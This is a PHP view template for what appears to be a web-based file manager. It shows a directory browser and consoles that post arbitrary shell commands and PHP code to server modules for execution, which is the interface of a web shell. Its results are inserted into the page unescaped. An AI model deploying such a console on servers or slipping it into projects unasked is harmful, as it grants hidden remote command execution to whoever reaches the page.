<style>
    #browser-holder {
        
    }

    #location-bar {
        height: 50px;
        line-height: 50px;
        background-color: #767676;
        color: #fff;
        margin-bottom: 15px;
        list-style: none;
        margin: 0 0 20px 0;
        padding: 0 10px;
    }

    #location-bar > li {
        float: left;
        margin-right: 10px;
    }

    #location-bar > li:last-child {
        float: right;
    }

    .locationbar-input input {
        line-height: 30px;
        width: 100%;
        color: #767676;
    }

    .command-line {
        color: #fff;
        background-color: #000;
        height: 250px;
        overflow: auto;
        font-family: 'Courier new', Courier, Verdana, Arial;
        padding: 5px;
        font-size: 14px;
        line-height: 20px;
        word-wrap: normal;
    }

    .command-line-input {
        width: 100%;
        padding: 0 5px;
        font-family: 'Courier new', Courier, Verdana, Arial;
        background-color: #000;
    }

    .actions-box {
        background-color: #0078D7;
        padding: 20px;
        color: #fff;
    }

    .actions-box p {
        color: #fff;
        margin: 0;
    }

    .error {
        background-color: #da3b01;
        color: #fff;
        padding: 30px;
        line-height: 50px;
    }

    .error > em {
        font-size: 50px;
        line-height: 50px;
    }
</style>

<article>
    <div class="container" id="browser-holder">
        <div class="row">
            <div class="col-xs-12">
                <ul id="location-bar">
                    <li>Location:</li>
                    <?php foreach (array('/') + explode(DIRECTORY_SEPARATOR, $path) as $directoryPart): ?>
                        <?php if (isset($firstDirectoryPart) && $firstDirectoryPart > 2): ?>
                            <li class="locationbar-default">/</li>
                            <?php $fullPath .= '/' . $directoryPart; ?>
                        <?php elseif (!isset($firstDirectoryPart)): ?>
                            <?php $firstDirectoryPart = 1; ?>
                            <?php $fullPath = ''; ?>
                        <?php else: ?>
                            <?php $fullPath .= '/' . $directoryPart; ?>
                        <?php endif; ?>

                        <li class="locationbar-default">
                            <a href="?path=<?php echo $this->encode($fullPath); ?>" class="btn btn-default"><?php echo $this->encode($directoryPart); ?></a>
                        </li>

                        <?php $firstDirectoryPart++; ?>
                    <?php endforeach; ?>
                    <li class="locationbar-input" style="display:none;width:75%;">
                        <form method="get"><input type="text" name="path" value="<?php echo $this->encode($path); ?>"></form>
                    </li>
                    <li>
                        <script>var locationBarDefault=true;</script>
                        <a href="javascript:;" onclick="locationBarDefault=!locationBarDefault;if(locationBarDefault){$('.locationbar-default').show();$('.locationbar-input').hide();} else {$('.locationbar-default').hide();$('.locationbar-input').show();}" class="btn btn-default"><em class="glyphicon glyphicon-sort"></em></a>
                    </li>
                </ul>
            </div>
        </div>

        <div class="row">
            <div class="col-xs-12">
                <p>Toolbar</p>
            </div>
        </div>

        <div class="row">
            <div class="col-xs-12">
                <?php if (!empty($error)): ?>
                    <p class="error">
                        <em class="glyphicpon glyphicon-remove"></em>
                        <?php echo $this->encode($error); ?>
                    </p>
                <?php else: ?>
                    <table class="table table-bordered table-striped">
                        <thead>
                            <tr>
                                <th><input type="checkbox"></th>
                                <th>Filename</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($files as $file): ?>
                                <tr>
                                    <td><input type="checkbox"></td>
                                    <td><pre><?php print_r($file); ?></pre></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php endif; ?>
            </div>
        </div>

        <div class="row">
            <div class="col-sm-5">
                <div class="actions-box">
                    <h3>Actions</h3>
                    <p>Actions</p>
                </div>
            </div>
            <div class="col-sm-2">&nbsp;</div>
            <div class="col-sm-5">
                <div class="actions-box">
                    <h3>Upload files</h3>
                    <p>Upload files</p>
                </div>
            </div>
        </div>
    </div>
</article>

<footer>
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <div class="row">
                    <div class="col-xs-12">
                        <h2>Shell commands</h2>
                        <pre class="command-line" id="shell-commands"></pre>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <input type="text" class="command-line-input" id="shell-command" placeholder="> Shell command">
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="row">
                    <div class="col-xs-12">
                        <h2>PHP code evaluation</h2>
                        <pre class="command-line" id="php-evals"></pre>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <input type="text" class="command-line-input" id="php-eval" placeholder="&lt;?php PHP code">
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>

<script>
    $(function(){
        $('#shell-command').on('keyup', function(event){
            if (event.keyCode==13) {
                var command = $(this).val();
                $('#shell-commands').html("&gt; " + command + '<br>');
                $(this).val('');

                $.post(
                    '?module=ShellCommand',
                    {command: command},
                    function (result) {
                        $('#shell-commands').html($('#shell-commands').html() + result + '<br>');
                    }
                );
            }
        });

        $('#php-eval').on('keyup', function(event){
            if (event.keyCode==13) {
                var code = $(this).val();
                $(this).val('');
                $('#php-evals').html('');

                $.post(
                    '?module=PHPEvaluation',
                    {code: code},
                    function (result) {
                        $('#php-evals').html($('#php-evals').html() + result + '<br>');
                    }
                );
            }
        });
    });
</script>
